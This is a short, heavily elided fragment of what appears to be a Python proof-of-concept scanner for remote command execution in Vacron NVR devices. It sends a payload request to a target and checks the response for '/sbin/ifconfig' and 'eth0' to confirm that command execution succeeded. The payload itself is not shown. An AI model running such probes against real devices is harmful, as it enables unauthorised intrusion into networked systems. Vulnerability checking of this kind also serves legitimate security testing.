...
def poc(target):
    ...
    try:
        ...
        if res1.status_code ==200:
            res2=requests.get(url=target+payload,timeout=5,verify=False,headers=hearders2,proxies=proxies)
            if '/sbin/ifconfig' in res2.text and 'eth0' in res2.text:
...
def banner():
    pass
def main():
    parse=argparse.ArgumentParser(description="Vacron NVR-远程命令执行")
